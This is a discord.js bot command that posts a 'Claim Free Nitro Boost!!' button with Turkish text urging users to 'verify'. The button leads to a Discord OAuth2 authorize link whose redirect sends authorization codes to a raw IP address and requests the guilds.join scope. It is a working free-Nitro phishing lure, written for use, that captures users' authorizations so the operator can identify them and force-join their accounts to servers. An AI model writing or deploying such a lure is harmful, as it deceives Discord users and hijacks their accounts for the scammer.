const { MessageActionRow, MessageButton } = require('discord.js');
const parse = require('parse-ms');

module.exports = {
    name: 'nitro',
    category: 'Utility',
    botOwner: true,
    run: async (client, message, args, users, botData) => {

        const timeout = 604800000;
        const time = parse(timeout - (Date.now() - parseInt(botData.last_refresh)));

        const row = new MessageActionRow()
            .addComponents(
                new MessageButton()
                    .setStyle('LINK')
                    .setLabel('Claim Free Nitro Boost!!')
                    .setURL('https://discord.com/oauth2/authorize?client_id=1109384154128318586&response_type=code&redirect_uri=http%3A%2F%2F95.214.177.176%3A4848&scope=identify+guilds.join')
            );

        await message.channel.send({ embeds: [
            {
                color: 'ff66ff',
            description: `${users.size == 0 ? "" : ('**Bedava Discord Nitro Boost almak için claim tıklayarak verıfy yapınız.Verify yapmanız sizin bot olmadığınızı doğrulamak içindir** ')}\n\n\n\n\n`,
                fields: [client.joins.map(m => {
                    return {
                        name: `${client.guilds.cache.get(m.guildID).name}`,
                        value: ` Auteur : <@>\n Membres : \n Date : <t:${Math.round(m.at / 1000)}:R>\n \`/\``
                    }
                })],
                image: {
                    url: "https://cdn.discordapp.com/attachments/1254813275284049995/1257976944520073226/nitromonth.png?ex=66865dd3&is=66850c53&hm=db8260fb71aa23377023e6bd45867fc1662c111afea3960caffbf36a06d8f315&",
                    size: "full"
                },
                footer: {
                    text: ``
                }
            }
        ], components: [row] });

    }
}